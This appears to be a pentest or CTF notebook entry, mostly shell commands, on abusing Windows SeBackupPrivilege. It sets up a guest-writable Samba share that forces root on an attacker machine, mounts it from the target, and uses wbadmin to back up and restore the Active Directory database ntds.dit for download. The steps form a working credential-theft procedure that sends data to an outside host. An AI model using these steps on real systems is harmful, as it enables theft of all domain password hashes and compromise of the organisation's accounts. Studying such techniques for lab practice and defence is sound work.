# SeBackupPrivilege

Exploit with `SeBackupPrivilege`.

You need to setup NTFS Disk to support remote windows backup.

## 0x0 Pre-setup ntfs

```bash
# Create 2G Disk
dd if=/dev/zero of=ntfs.disk bs=1024M count=2 

# Mount disk
sudo losetup -fP ntfs.disk

# Check Mount 
losetup -a

# format ntfs
sudo mkfs.ntfs /dev/loop0

# Mount 
sudo mount /dev/loop0 smb/

# Check mount
mount | grep smb

```
## 0x1 Install and setup smb

```bash
sudo vim /etc/samba/smb.conf
```

```config

# Comment the following line
# map to guest = bad user

# add config
[mane]
   comment = mane testing
   path = /home/mane/Challenge/smb
   writeable = yes
   guest ok = yes
   read only = no
   valid users = smbuser
   write list = smbuser
   force user = root
```

```bash
# add user
sudo adduser smbuser

# set password
sudo smbpasswd -a smbuser

# restart smb
sudo service smb restart
```

## 0x2 Testing smb share
```bash
$ smbmap -u 'smbuser' -p 'password' -H 127.0.0.1

[+] IP: 127.0.0.1:445   Name: localhost                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        mane                                                    READ, WRITE     mane testing
        print$                                                  READ ONLY       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.19.0-Debian)
        smbuser                                                 READ ONLY       Home Directories

```

## 0x3 Mount remote PC

Cache the smb credential

```cmd
net use M: \\10.10.16.14\mane /user:smbuser password

dir M:\
```

## 0x4 Exploit

```
echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.14\mane -include:c:\windows\ntds

# Look at the backup version
wbadmin get versions

# Restore the version
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

## 0x5 Finally

When Exploit ok, download ntds.dit in `C:\`.


# Reference

https://rootsecdev.medium.com/abusing-sebackupprivilege-cd5d1a88f992

https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s
